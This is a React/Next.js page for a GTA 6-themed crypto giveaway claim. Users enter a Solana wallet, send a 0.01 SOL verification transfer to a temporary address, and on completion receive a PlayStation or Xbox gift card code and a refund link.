"use client";

import { useCallback, useEffect, useState } from "react";
import { Footer } from "@/components/Footer";
import { Header } from "@/components/Header";
import { ViceBackground } from "@/components/ViceBackground";

type ClaimStep = "enter" | "verify" | "complete" | "error";

type Platform = "playstation" | "xbox";

interface ClaimStartResponse {
  claimId: string;
  claimToken: string;
  tempPubkey: string;
  verifyAmountSol: number;
  verifyAmountLamports: number;
  expiresAt: string;
  status: string;
  platform?: Platform;
  reward: { amountUsd: number; platformLabel: string };
}

const SESSION_KEY = "gta6-claim-session";

function saveClaimSession(wallet: string, data: ClaimStartResponse) {
  sessionStorage.setItem(
    SESSION_KEY,
    JSON.stringify({ wallet, ...data }),
  );
}

function loadClaimSession(wallet: string): ClaimStartResponse | null {
  try {
    const raw = sessionStorage.getItem(SESSION_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as ClaimStartResponse & { wallet: string };
    if (parsed.wallet !== wallet) return null;
    return parsed;
  } catch {
    return null;
  }
}

interface ClaimStatusResponse {
  status: string;
  tempPubkey?: string;
  verifyAmountSol?: number;
  holderWallet?: string;
  message?: string;
  verifiedTxSig?: string;
  refundTxSig?: string;
  reward?: {
    brand: string;
    platformLabel?: string;
    amountUsd: number;
    code?: string;
    pin?: string;
    link?: string;
    instructions?: string;
  };
}

export default function ClaimPage() {
  const [wallet, setWallet] = useState("");
  const [platform, setPlatform] = useState<Platform>("playstation");
  const [step, setStep] = useState<ClaimStep>("enter");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [claim, setClaim] = useState<ClaimStartResponse | null>(null);
  const [claimToken, setClaimToken] = useState<string | null>(null);
  const [statusData, setStatusData] = useState<ClaimStatusResponse | null>(
    null,
  );

  const pollStatus = useCallback(
    async (claimId: string, token: string) => {
      const res = await fetch("/api/claim/status", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ claimId, claimToken: token }),
      });
      const data = (await res.json()) as ClaimStatusResponse;
      setStatusData(data);

      if (data.status === "COMPLETE") {
        setStep("complete");
        sessionStorage.removeItem(SESSION_KEY);
        return true;
      }
      if (data.status === "EXPIRED" || data.status === "ERROR") {
        setStep("error");
        setError(data.message ?? "Claim failed");
        return true;
      }
      return false;
    },
    [],
  );

  useEffect(() => {
    if (step !== "verify" || !claim || !claimToken) return;

    const interval = setInterval(async () => {
      const done = await pollStatus(claim.claimId, claimToken);
      if (done) clearInterval(interval);
    }, 5000);

    pollStatus(claim.claimId, claimToken);
    return () => clearInterval(interval);
  }, [step, claim, claimToken, pollStatus]);

  async function handleStart(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const trimmedWallet = wallet.trim();
      const saved = loadClaimSession(trimmedWallet);

      const res = await fetch("/api/claim/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: trimmedWallet,
          claimToken: saved?.claimToken,
          platform: saved?.platform ?? platform,
        }),
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error ?? "Failed to start claim");
      }

      const claimData = data as ClaimStartResponse;
      saveClaimSession(trimmedWallet, claimData);
      setClaim(claimData);
      setClaimToken(claimData.claimToken);
      setStep("verify");
    } catch (e) {
      setError(e instanceof Error ? e.message : "Something went wrong");
      setStep("error");
    } finally {
      setLoading(false);
    }
  }

  function copyToClipboard(text: string) {
    navigator.clipboard.writeText(text);
  }

  return (
    <div className="min-h-screen">
      <Header />

      <main className="relative min-h-screen overflow-hidden px-6 pb-24 pt-36">
        <ViceBackground withSun={false} />
        <div className="relative z-10 mx-auto max-w-xl">
          <div className="mb-10 text-center">
            <p className="eyebrow mx-auto mb-4 w-fit">Winner Verification</p>
            <h1 className="mt-4 font-display text-5xl tracking-wide text-white sm:text-6xl">
              CLAIM YOUR <span className="gradient-text">REWARD</span>
            </h1>
            <p className="mx-auto mt-5 max-w-md text-sm leading-relaxed text-vice-muted">
              Choose PlayStation or Xbox, then prove wallet ownership with a
              0.01 SOL verification transfer. Your SOL will be refunded minus a
              small network fee.
            </p>
          </div>

          {step === "enter" && (
            <form
              onSubmit={handleStart}
              className="card-glass card-neon rounded-2xl p-8"
            >
              <label className="block text-xs uppercase tracking-widest text-vice-muted">
                Your Winning Wallet Address
              </label>
              <input
                type="text"
                value={wallet}
                onChange={(e) => setWallet(e.target.value)}
                placeholder="Enter your Solana wallet address"
                className="mt-3 w-full rounded border border-white/10 bg-vice-black px-4 py-3 font-mono text-sm text-white placeholder:text-vice-muted/50 focus:border-vice-pink focus:outline-none"
                required
              />

              <p className="mt-6 text-xs uppercase tracking-widest text-vice-muted">
                Choose your platform
              </p>
              <div className="mt-3 grid grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => setPlatform("playstation")}
                  className={`rounded-xl border px-4 py-4 text-left transition ${
                    platform === "playstation"
                      ? "border-vice-pink bg-vice-pink/10"
                      : "border-white/10 bg-vice-black/40 hover:border-white/25"
                  }`}
                >
                  <p className="font-display text-sm text-white">PlayStation</p>
                  <p className="mt-1 text-xs text-vice-muted">PS Store USD</p>
                </button>
                <button
                  type="button"
                  onClick={() => setPlatform("xbox")}
                  className={`rounded-xl border px-4 py-4 text-left transition ${
                    platform === "xbox"
                      ? "border-vice-teal bg-vice-teal/10"
                      : "border-white/10 bg-vice-black/40 hover:border-white/25"
                  }`}
                >
                  <p className="font-display text-sm text-white">Xbox</p>
                  <p className="mt-1 text-xs text-vice-muted">Xbox Store USD</p>
                </button>
              </div>

              <button
                type="submit"
                disabled={loading || !wallet.trim()}
                className="btn-primary mt-6 w-full"
              >
                {loading ? "Checking..." : "Start Claim"}
              </button>
            </form>
          )}

          {step === "verify" && claim && (
            <div className="card-glass card-neon rounded-2xl p-8 space-y-6">
              <div className="rounded border border-vice-teal/30 bg-vice-teal/5 p-4">
                <p className="text-xs uppercase tracking-widest text-vice-teal">
                  You won!
                </p>
                <p className="mt-2 font-display text-xl text-white">
                  ${claim.reward.amountUsd}{" "}
                  {claim.reward.platformLabel} Gift Card
                </p>
              </div>

              <div>
                <p className="text-sm text-vice-muted">
                  Send exactly{" "}
                  <strong className="text-white">
                    {claim.verifyAmountSol} SOL
                  </strong>{" "}
                  from your winning wallet to this temporary address:
                </p>
                <div className="mt-3 flex items-center gap-2">
                  <code className="flex-1 break-all rounded border border-white/10 bg-vice-black px-3 py-2 font-mono text-xs text-vice-teal">
                    {claim.tempPubkey}
                  </code>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(claim.tempPubkey)}
                    className="btn-secondary shrink-0 px-3 py-2 text-xs"
                  >
                    Copy
                  </button>
                </div>
              </div>

              <div className="flex items-center gap-3 text-sm text-vice-muted">
                <div className="h-2 w-2 rounded-full bg-vice-pink pulse-glow" />
                Waiting for verification transaction...
              </div>

              <p className="text-xs text-vice-muted">
                Expires: {new Date(claim.expiresAt).toLocaleString()}
              </p>
            </div>
          )}

          {step === "complete" && statusData?.reward && (
            <div className="card-glass card-neon rounded-2xl p-8 space-y-6">
              <div className="text-center">
                <p className="font-display text-2xl gradient-text">
                  VERIFIED!
                </p>
                <p className="mt-2 text-vice-muted">
                  Your gift card is ready. Save these details — they won&apos;t
                  be shown again.
                </p>
              </div>

              <div className="rounded border border-vice-pink/30 bg-vice-pink/5 p-6 space-y-4">
                <div>
                  <p className="text-xs uppercase tracking-widest text-vice-muted">
                    Brand
                  </p>
                  <p className="font-display text-lg text-white uppercase">
                    {statusData.reward.platformLabel ?? statusData.reward.brand}
                  </p>
                </div>
                <div>
                  <p className="text-xs uppercase tracking-widest text-vice-muted">
                    Amount
                  </p>
                  <p className="font-display text-lg text-white">
                    ${statusData.reward.amountUsd}
                  </p>
                </div>
                {statusData.reward.code && (
                  <div>
                    <p className="text-xs uppercase tracking-widest text-vice-muted">
                      Gift Card Code
                    </p>
                    <div className="mt-1 flex items-center gap-2">
                      <code className="flex-1 break-all font-mono text-lg text-vice-teal">
                        {statusData.reward.code}
                      </code>
                      <button
                        type="button"
                        onClick={() => copyToClipboard(statusData.reward!.code!)}
                        className="btn-secondary shrink-0 px-3 py-2 text-xs"
                      >
                        Copy
                      </button>
                    </div>
                  </div>
                )}
                {statusData.reward.pin && (
                  <div>
                    <p className="text-xs uppercase tracking-widest text-vice-muted">
                      PIN
                    </p>
                    <code className="font-mono text-lg text-vice-teal">
                      {statusData.reward.pin}
                    </code>
                  </div>
                )}
                {statusData.reward.link && (
                  <div>
                    <p className="text-xs uppercase tracking-widest text-vice-muted">
                      Redemption Link
                    </p>
                    <a
                      href={statusData.reward.link}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="mt-1 block break-all font-mono text-sm text-vice-teal hover:underline"
                    >
                      {statusData.reward.link}
                    </a>
                  </div>
                )}
                {statusData.reward.instructions && (
                  <div>
                    <p className="text-xs uppercase tracking-widest text-vice-muted">
                      How To Redeem
                    </p>
                    <p className="mt-1 text-sm leading-relaxed text-white/80">
                      {statusData.reward.instructions}
                    </p>
                  </div>
                )}
              </div>

              {statusData.refundTxSig && (
                <p className="text-xs text-vice-muted">
                  Refund sent. Tx:{" "}
                  <a
                    href={`https://solscan.io/tx/${statusData.refundTxSig}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-vice-teal hover:underline"
                  >
                    {statusData.refundTxSig.slice(0, 16)}...
                  </a>
                </p>
              )}
            </div>
          )}

          {step === "error" && (
            <div className="card-glass rounded-2xl p-8 text-center">
              <p className="font-display text-xl text-vice-pink">Error</p>
              <p className="mt-3 text-vice-muted">{error}</p>
              <button
                type="button"
                onClick={() => {
                  setStep("enter");
                  setError(null);
                  setClaim(null);
                  setClaimToken(null);
                }}
                className="btn-secondary mt-6"
              >
                Try Again
              </button>
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
}
